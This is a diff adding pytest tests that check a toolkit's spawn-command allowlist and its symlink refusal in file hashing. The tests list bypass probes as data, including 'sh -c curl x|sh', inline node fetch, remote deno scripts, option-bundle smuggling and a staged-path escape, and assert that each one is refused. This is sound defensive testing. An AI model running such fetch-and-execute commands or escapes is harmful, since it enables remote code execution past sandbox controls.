@@ -1306,3 +1306,88 @@ def test_review4_staged_copy_is_reverified_after_staging(tmp_path: Path):
     staged2 = stage_toolkit(resolved2, tmp_path / "staged-ok")
     assert _hash_tree(staged2 / "skills" / "demo-skill") == skill2["files"]
     assert _hash_tree(staged2 / "mcp" / "docs") == mcp2["files"]
+
+
+# --------------- owner review round 2 on PR #77 (2 findings, red-first) -----
+
+
+def test_review5_spawn_rule_is_an_allowlist_not_a_denylist():
+    """Finding 1 (round 2): the round-1 denylist was bypassable — every
+    probe below was ADMITTED on 9769e79. The rule is now an allowlist:
+    a vendored ``{staged}/...`` executable, or an allowed interpreter
+    whose FIRST non-option argument is a ``{staged}/...`` script; only
+    benign runtime flags may precede the script; shells, inline-code
+    and module flags, URL args and staged-root escapes all refuse."""
+    from factory.toolkit import vet_descriptor
+
+    def spawn(command, args):
+        return vet_descriptor({
+            "command": command, "args": args,
+            "env": {},
+            "tools": [{"name": "search", "mode": "read"}],
+            "domains": ["docs.example.com"],
+        }, allowlists=ALLOW)
+
+    # The six bypass probes from the review, each refused, each reason
+    # naming what was probed.
+    probes = [
+        ("python3.12", ["-m", "pip", "install", "x", "{staged}/a"],
+         "python3.12"),
+        ("python3", ["-I", "-m", "pip", "install", "x", "{staged}"], "-I"),
+        ("npm", ["exec", "pkg", "{staged}"], "npm"),
+        ("node", ["-e", "fetch('https://registry.npmjs.org/x')", "{staged}"],
+         "-e"),
+        ("sh", ["-c", "curl x|sh", "{staged}"], "sh"),
+        ("deno", ["run", "https://x/y.ts", "{staged}"], "deno"),
+        # …and the reviewer's extra shapes.
+        ("env", ["sh", "-c", "curl x|sh"], "env"),
+        ("node", ["--require", "x", "{staged}/s.js"], "--require"),
+        ("node", ["{staged}/../x"], "{staged}/../x"),
+    ]
+    for command, args, marker in probes:
+        reasons = spawn(command, args)
+        assert reasons, (command, args)
+        assert any(marker in r for r in reasons), (command, args, reasons)
+
+    # The admitted shapes: a vendored script under an allowed
+    # interpreter (flags after the script belong to the script —
+    # ``--port`` is not ``-p``), and a vendored executable itself.
+    assert spawn("node", ["{staged}/server.js"]) == []
+    assert spawn("python3", ["{staged}/server.py", "--port-free-flag"]) == []
+    assert spawn("{staged}/bin/server", ["--verbose"]) == []
+    # A benign runtime flag before the script is fine; anything else
+    # before it (option bundles smuggle letters past exact matching)
+    # refuses.
+    assert spawn("python3", ["-u", "{staged}/server.py"]) == []
+    assert spawn("python3", ["-Ic", "{staged}/server.py"]) != []
+
+
+def test_review6_file_hashes_refuse_links_at_the_choke_point(tmp_path: Path):
+    """Finding 2 (round 2): ``file_hashes`` silently skipped symlinks —
+    refusal depended on every caller remembering the separate check. It
+    now raises at the one choke point, so ``content_hash_of`` and every
+    future caller inherit the refusal; the vet keeps its finding class
+    for the report."""
+    import os
+
+    from factory.toolkit import ToolkitError, content_hash_of, file_hashes
+
+    real_dir = tmp_path / "real"
+    real_dir.mkdir()
+    (real_dir / "x.md").write_text("x\n")
+    outside = tmp_path / "outside.md"
+    outside.write_text("outside\n")
+
+    for name, plant in (
+        ("symlinked file", lambda root: (root / "link.md").symlink_to(outside)),
+        ("symlinked dir", lambda root: (root / "sub").symlink_to(real_dir)),
+        ("fifo", lambda root: os.mkfifo(root / "pipe")),
+    ):
+        tree = tmp_path / f"tree-{name.replace(' ', '-')}"
+        tree.mkdir()
+        (tree / "SKILL.md").write_text(SKILL_MD)
+        plant(tree)
+        with pytest.raises(ToolkitError, match="link|pipe|sub"):
+            file_hashes(tree)
+        with pytest.raises(ToolkitError):
+            content_hash_of(tree)
